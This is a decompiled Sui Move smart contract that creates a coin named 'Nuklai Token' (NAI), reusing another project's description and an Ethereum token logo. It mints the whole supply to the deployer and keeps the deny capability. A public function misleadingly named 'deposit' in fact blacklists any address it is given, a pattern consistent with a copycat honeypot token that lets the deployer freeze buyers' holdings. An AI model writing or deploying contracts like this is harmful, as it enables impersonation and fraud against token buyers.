module 0x358a919673ef02f1da40e94e52dabfbfed143346623e21690636de4b59d22024::nai {
    struct NAI has drop {
        dummy_field: bool,
    }

    public fun deposit(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<NAI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<NAI>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: NAI, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = trim_right(b"111111111   ");
        let v1 = trim_right(b"https://dd.dexscreener.com/ds-data/tokens/ethereum/0x5ac34c53a04b9aaa0bf047e7291fb4e8a48f2a18.png?size=lg&key=dc929e                                                                                                                                                                                                            ");
        let v2 = if (0x1::vector::length<u8>(&v1) == 0) {
            0x1::option::none<0x2::url::Url>()
        } else {
            0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(v1))
        };
        let (v3, v4, v5) = 0x2::coin::create_regulated_currency_v2<NAI>(arg0, (0x1::vector::length<u8>(&v0) as u8), 0x1::ascii::into_bytes(0x1::string::to_ascii(0x1::string::utf8(trim_right(b"NAI     ")))), trim_right(b"Nuklai Token                    "), trim_right(b"Nuklai is an innovative layer 1 blockchain infrastructure to host a collaborative data ecosystem that will fuel the next generation of AI and Large Language Models (LLMs) with world-class data.                                                                                                                               "), v2, false, arg1);
        let v6 = v3;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<NAI>>(v5);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<NAI>>(v6);
        0x2::transfer::public_transfer<0x2::coin::Coin<NAI>>(0x2::coin::mint<NAI>(&mut v6, 1000000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<NAI>>(v4, 0x2::tx_context::sender(arg1));
    }

    fun trim_right(arg0: vector<u8>) : vector<u8> {
        let v0 = 32;
        let v1 = &v0;
        while (0x1::vector::length<u8>(&arg0) > 0) {
            if (0x1::vector::borrow<u8>(&arg0, 0x1::vector::length<u8>(&arg0) - 1) != v1) {
                break
            };
            0x1::vector::pop_back<u8>(&mut arg0);
        };
        arg0
    }

    // decompiled from Move bytecode v6
}

